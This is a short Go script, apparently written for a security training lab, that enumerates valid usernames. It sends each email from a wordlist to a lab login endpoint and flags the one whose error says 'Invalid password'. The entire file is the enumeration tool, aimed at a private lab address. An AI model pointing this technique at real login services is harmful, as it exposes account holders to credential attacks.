package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
)

func makeRequest(email string){
  // Define the URL
  url := "http://10.10.21.10/labs/verbose_login/functions.php"

  // Prepare the form data
  formData := map[string]string{
    "username": email,
    "password": "asdf",
    "function": "login",
  }

  // Create a payload
  var payload bytes.Buffer
  for key, val := range formData {
    fmt.Fprintf(&payload, "%s=%s&", key, val)
  }
  payloadStr := payload.String()[:len(payload.String())-1] // Remove trailing "&"

  // Create a new HTTP request
  req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader([]byte(payloadStr)))
  if err != nil {
    panic(err)
  }

  // Set headers
  req.Header.Set("Host", "10.10.21.10")
  req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0")
  req.Header.Set("Accept", "application/json, text/javascript, */*; q=0.01")
  req.Header.Set("Accept-Language", "en-US,en;q=0.5")
  req.Header.Set("Accept-Encoding", "gzip, deflate")
  req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
  req.Header.Set("X-Requested-With", "XMLHttpRequest")
  req.Header.Set("Content-Length",  
    fmt.Sprintf("%d",  
      len(payloadStr)))
  req.Header.Set("Origin", "http://10.10.21.10")
  req.Header.Set("Sec-GPC", "1")
  req.Header.Set("Connection", "keep-alive")
  req.Header.Set("Referer", "http://10.10.21.10/labs/verbose_login/")
  req.Header.Set("Cookie", "PHPSESSID=mrlgf4vedodjq60oi80m4jbba8")

  // Send the request
  client := &http.Client{}
  resp, err := client.Do(req)
  if err != nil {
    panic(err)
  }
  defer resp.Body.Close()

  // Read the response body
  body, err := io.ReadAll(resp.Body)
  if err != nil {
    panic(err)
  }

  // Print the response  

  if string(body) == "{\"status\":\"error\",\"message\":\"Invalid password\"}" {
    fmt.Println("FOUND IT!")
    os.Exit(0)
  } else {
    fmt.Println("NOT THIS ONE")
  }
}

func readEmail(){
  file, err := os.Open("./usernames_gmail.com.txt")
  if err != nil {
    log.Fatal(err)
  }

  scanner := bufio.NewScanner(file)
  for scanner.Scan() {
    fmt.Print(scanner.Text() + ":")
    makeRequest(scanner.Text())
  }
}

func main() {
  readEmail()
}
